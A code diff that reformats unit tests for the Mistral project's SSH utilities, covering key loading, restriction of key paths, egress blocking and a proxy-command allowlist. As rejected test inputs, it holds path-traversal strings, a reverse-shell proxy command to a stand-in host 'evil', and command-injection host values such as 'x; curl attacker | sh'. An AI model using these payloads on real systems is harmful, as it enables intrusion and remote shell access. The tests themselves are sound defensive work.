@@ -65,15 +65,24 @@ class SSHUtilsTest(base.BaseTest):
         self.assertIsNotNone(result)
         self.assertIsInstance(result, ECDSAKey)
 
-    @unittest.skipUnless(shutil.which('ssh-keygen'),
-                         'ssh-keygen not available')
+    @unittest.skipUnless(
+        shutil.which('ssh-keygen'), 'ssh-keygen not available'
+    )
     def test_to_paramiko_private_key_ed25519_from_string(self):
         """Ed25519 key passed as string is loaded."""
         with tempfile.TemporaryDirectory() as tmpdir:
             key_path = os.path.join(tmpdir, 'id_ed25519')
             subprocess.run(
-                ['ssh-keygen', '-t', 'ed25519', '-f',
-                 key_path, '-N', '', '-q'],
+                [
+                    'ssh-keygen',
+                    '-t',
+                    'ed25519',
+                    '-f',
+                    key_path,
+                    '-N',
+                    '',
+                    '-q',
+                ],
                 check=True,
                 capture_output=True,
             )
@@ -92,8 +101,9 @@ class SSHUtilsTest(base.BaseTest):
         """Key types are tried in order; first success is returned."""
         with mock.patch.object(RSAKey, 'from_private_key') as rsa_from:
             with mock.patch.object(ECDSAKey, 'from_private_key') as ecdsa_from:
-                with mock.patch.object(Ed25519Key,
-                                       'from_private_key') as ed_from:
+                with mock.patch.object(
+                    Ed25519Key, 'from_private_key'
+                ) as ed_from:
                     rsa_from.side_effect = SSHException('not RSA')
                     ecdsa_from.side_effect = SSHException('not ECDSA')
                     fake_key = mock.Mock()
@@ -123,8 +133,9 @@ class SSHUtilsTest(base.BaseTest):
     def test_to_paramiko_private_key_rsa_from_file(self):
         """RSA key loaded from file via private_key_filename."""
         key_dir = self.useFixture(fixtures.TempDir()).path
-        self.override_config('private_key_dir', key_dir,
-                             group='action_std_ssh')
+        self.override_config(
+            'private_key_dir', key_dir, group='action_std_ssh'
+        )
         RSAKey.generate(2048).write_private_key_file(
             os.path.join(key_dir, 'my_key')
         )
@@ -155,8 +166,9 @@ class SSHPrivateKeyPathTest(base.BaseTest):
         self.key_dir = os.path.join(self.tmp_dir, 'keys')
         os.mkdir(self.key_dir)
 
-        self.override_config('private_key_dir', self.key_dir,
-                             group='action_std_ssh')
+        self.override_config(
+            'private_key_dir', self.key_dir, group='action_std_ssh'
+        )
 
     def _assert_rejected(self, filename):
         with mock.patch.object(RSAKey, 'from_private_key_file') as rsa_from:
@@ -183,14 +195,12 @@ class SSHPrivateKeyPathTest(base.BaseTest):
 
     def test_plain_filename_is_resolved_in_key_dir(self):
         self._assert_loaded_from(
-            'my_key',
-            os.path.join(self.key_dir, 'my_key')
+            'my_key', os.path.join(self.key_dir, 'my_key')
         )
 
     def test_subdirectory_of_key_dir_is_allowed(self):
         self._assert_loaded_from(
-            'project/my_key',
-            os.path.join(self.key_dir, 'project', 'my_key')
+            'project/my_key', os.path.join(self.key_dir, 'project', 'my_key')
         )
 
     def test_absolute_path_inside_key_dir_is_allowed(self):
@@ -199,13 +209,18 @@ class SSHPrivateKeyPathTest(base.BaseTest):
         self._assert_loaded_from(key_path, key_path)
 
     def test_absolute_path_outside_key_dir_is_rejected(self):
-        for filename in ('/etc/mistral/deploy_key',
-                         os.path.join(self.tmp_dir, 'other_key')):
+        for filename in (
+            '/etc/mistral/deploy_key',
+            os.path.join(self.tmp_dir, 'other_key'),
+        ):
             self._assert_rejected(filename)
 
     def test_path_traversal_is_rejected(self):
-        for filename in ('../../../etc/passwd', '../other_key',
-                         'project/../../other_key'):
+        for filename in (
+            '../../../etc/passwd',
+            '../other_key',
+            'project/../../other_key',
+        ):
             self._assert_rejected(filename)
 
     def test_prefix_sibling_directory_is_rejected(self):
@@ -224,47 +239,58 @@ class SSHPrivateKeyPathTest(base.BaseTest):
     def test_symlinked_key_dir_is_followed(self):
         link_dir = os.path.join(self.tmp_dir, 'link_dir')
         os.symlink(self.key_dir, link_dir)
-        self.override_config('private_key_dir', link_dir,
-                             group='action_std_ssh')
+        self.override_config(
+            'private_key_dir', link_dir, group='action_std_ssh'
+        )
 
         self._assert_loaded_from(
-            'my_key',
-            os.path.join(self.key_dir, 'my_key')
+            'my_key', os.path.join(self.key_dir, 'my_key')
         )
 
     def test_default_key_dir_is_home_ssh(self):
-        self.override_config('private_key_dir', '~/.ssh',
-                             group='action_std_ssh')
+        self.override_config(
+            'private_key_dir', '~/.ssh', group='action_std_ssh'
+        )
 
         self._assert_loaded_from(
             'my_key',
             os.path.join(
                 os.path.realpath(os.path.expanduser('~/.ssh')), 'my_key'
-            )
+            ),
         )
 
 
-@mock.patch.object(egress.socket, 'getaddrinfo',
-                   return_value=[(None, None, None, '', ('127.0.0.1', 22))])
+@mock.patch.object(
+    egress.socket,
+    'getaddrinfo',
+    return_value=[(None, None, None, '', ('127.0.0.1', 22))],
+)
 class SSHEgressTest(base.BaseTest):
     @mock.patch('mistral.utils.ssh_utils._connect')
     def test_execute_command_blocked_host(self, mock_connect, gai):
         self.assertRaises(
             exc.UrlNotAllowedException,
             ssh_utils.execute_command,
-            'ls', 'localhost', 'user'
+            'ls',
+            'localhost',
+            'user',
         )
 
         gai.assert_called_once_with('localhost', 22)
         mock_connect.assert_not_called()
 
     @mock.patch('paramiko.SSHClient')
-    def test_execute_command_via_gateway_blocked_gateway(self, mock_client,
-                                                         gai):
+    def test_execute_command_via_gateway_blocked_gateway(
+        self, mock_client, gai
+    ):
         self.assertRaises(
             exc.UrlNotAllowedException,
             ssh_utils.execute_command_via_gateway,
-            'ls', 'target', 'user', None, 'localhost'
+            'ls',
+            'target',
+            'user',
+            None,
+            'localhost',
         )
 
         gai.assert_called_once_with('localhost', 22)
@@ -274,8 +300,9 @@ class SSHEgressTest(base.BaseTest):
     @mock.patch.object(ssh_utils, '_execute_command', return_value=(0, 'ok'))
     @mock.patch.object(ssh_utils, '_connect')
     @mock.patch('paramiko.SSHClient')
-    def test_execute_command_via_gateway_host_not_resolved(self, mock_client,
-                                                           *args):
+    def test_execute_command_via_gateway_host_not_resolved(
+        self, mock_client, *args
+    ):
         gai = args[-1]
         gai.return_value = [(None, None, None, '', ('203.0.113.10', 22))]
 
@@ -288,25 +315,33 @@ class SSHEgressTest(base.BaseTest):
     @mock.patch('paramiko.ProxyCommand')
     @mock.patch('paramiko.SSHClient')
     def test_execute_command_via_gateway_proxy_command_skips_check(
-            self, mock_client, mock_proxy_cmd, gai):
-        self.override_config('allowed_proxy_commands', ['nc gateway 22'],
-                             group='action_std_ssh')
+        self, mock_client, mock_proxy_cmd, gai
+    ):
+        self.override_config(
+            'allowed_proxy_commands', ['nc gateway 22'], group='action_std_ssh'
+        )
 
-        with mock.patch.object(ssh_utils, '_connect'), \
-                mock.patch.object(ssh_utils, '_cleanup'), \
-                mock.patch.object(ssh_utils, '_execute_command',
-                                  return_value=(0, 'ok')):
+        with (
+            mock.patch.object(ssh_utils, '_connect'),
+            mock.patch.object(ssh_utils, '_cleanup'),
+            mock.patch.object(
+                ssh_utils, '_execute_command', return_value=(0, 'ok')
+            ),
+        ):
             ssh_utils.execute_command_via_gateway(
-                'ls', 'target', 'user', None, 'localhost',
-                proxy_command='nc gateway 22'
+                'ls',
+                'target',
+                'user',
+                None,
+                'localhost',
+                proxy_command='nc gateway 22',
             )
 
         gai.assert_not_called()
 
     @mock.patch('mistral.utils.ssh_utils._execute_command')
     @mock.patch('mistral.utils.ssh_utils._connect')
-    def test_execute_command_allowed_host(self, mock_connect, mock_exec,
-                                          gai):
+    def test_execute_command_allowed_host(self, mock_connect, mock_exec, gai):
         gai.return_value = [(None, None, None, '', ('203.0.113.10', 22))]
         mock_exec.return_value = (0, 'ok')
 
@@ -332,8 +367,12 @@ class SSHProxyCommandAllowlistTest(base.BaseTest):
         self.assertRaises(
             exc.ActionException,
             ssh_utils.execute_command_via_gateway,
-            'ls', 'target', 'user', None, 'gateway',
-            proxy_command='touch /tmp/pwned'
+            'ls',
+            'target',
+            'user',
+            None,
+            'gateway',
+            proxy_command='touch /tmp/pwned',
         )
 
         mock_proxy_cmd.assert_not_called()
@@ -341,16 +380,18 @@ class SSHProxyCommandAllowlistTest(base.BaseTest):
     @mock.patch('paramiko.ProxyCommand')
     def test_proxy_command_not_in_allowlist_rejected(self, mock_proxy_cmd):
         self.override_config(
-            'allowed_proxy_commands',
-            ['nc gateway 22'],
-            group='action_std_ssh'
+            'allowed_proxy_commands', ['nc gateway 22'], group='action_std_ssh'
         )
 
         self.assertRaises(
             exc.ActionException,
             ssh_utils.execute_command_via_gateway,
-            'ls', 'target', 'user', None, 'gateway',
-            proxy_command='nc evil 4444 -e /bin/sh'
+            'ls',
+            'target',
+            'user',
+            None,
+            'gateway',
+            proxy_command='nc evil 4444 -e /bin/sh',
         )
 
         mock_proxy_cmd.assert_not_called()
@@ -361,18 +402,25 @@ class SSHProxyCommandAllowlistTest(base.BaseTest):
     @mock.patch('paramiko.SSHClient')
     @mock.patch('paramiko.ProxyCommand')
     def test_allow_listed_proxy_command_is_used(
-            self, mock_proxy_cmd, mock_ssh_client, mock_connect,
-            mock_exec, mock_cleanup):
+        self,
+        mock_proxy_cmd,
+        mock_ssh_client,
+        mock_connect,
+        mock_exec,
+        mock_cleanup,
+    ):
         self.override_config(
-            'allowed_proxy_commands',
-            ['nc gateway 22'],
-            group='action_std_ssh'
+            'allowed_proxy_commands', ['nc gateway 22'], group='action_std_ssh'
         )
         mock_exec.return_value = (0, 'ok')
 
         ret = ssh_utils.execute_command_via_gateway(
-            'ls', 'target', 'user', None, 'gateway',
-            proxy_command='nc gateway 22'
+            'ls',
+            'target',
+            'user',
+            None,
+            'gateway',
+            proxy_command='nc gateway 22',
         )
 
         # The exact allow-listed command reaches paramiko.
@@ -394,27 +442,55 @@ class SSHProxyCommandAllowlistTest(base.BaseTest):
 @mock.patch.object(ssh_utils, '_connect')
 @mock.patch('paramiko.SSHClient')
 class SSHProxiedHostTest(base.BaseTest):
-
     def test_injection_rejected_before_gateway_connection(
-            self, mock_ssh_client, *_):
-        for host in ('x; curl attacker | sh', 'x$(id)', 'x`id`',
-                     'x\nid', 'x id', 'x|id', 'x&id', '-oProxyCommand=id',
-                     '-e/bin/sh', 'host.', '.host', 'host-', 'a..b', '_x',
-                     '[::1]', 'fe80::1%eth0', '', 'a' * 64, None):
+        self, mock_ssh_client, *_
+    ):
+        for host in (
+            'x; curl attacker | sh',
+            'x$(id)',
+            'x`id`',
+            'x\nid',
+            'x id',
+            'x|id',
+            'x&id',
+            '-oProxyCommand=id',
+            '-e/bin/sh',
+            'host.',
+            '.host',
+            'host-',
+            'a..b',
+            '_x',
+            '[::1]',
+            'fe80::1%eth0',
+            '',
+            'a' * 64,
+            None,
+        ):
             self.assertRaises(
                 exc.ActionException,
                 ssh_utils.execute_command_via_gateway,
-                'ls', host, 'user', None, 'gateway'
+                'ls',
+                host,
+                'user',
+                None,
+                'gateway',
             )
 
         mock_ssh_client.assert_not_called()
 
     def test_valid_hosts_are_proxied(self, mock_ssh_client, *_):
-        exec_command = (mock_ssh_client.return_value.get_transport
-                        .return_value.open_session.return_value.exec_command)
+        transport = mock_ssh_client.return_value.get_transport.return_value
+        exec_command = transport.open_session.return_value.exec_command
 
-        for host in ('target', 'node-1.example.com', 'node_1', '10.0.0.1',
-                     '2001:db8::1', '::1', 'a' * 63):
+        for host in (
+            'target',
+            'node-1.example.com',
+            'node_1',
+            '10.0.0.1',
+            '2001:db8::1',
+            '::1',
+            'a' * 63,
+        ):
             exec_command.reset_mock()
 
             ssh_utils.execute_command_via_gateway(
@@ -428,7 +504,5 @@ class SSHProxiedHostTest(base.BaseTest):
 
         self.assertEqual(255, len(host))
         self.assertRaises(
-            exc.ActionException,
-            ssh_utils._validate_host_literal,
-            host
+            exc.ActionException, ssh_utils._validate_host_literal, host
         )
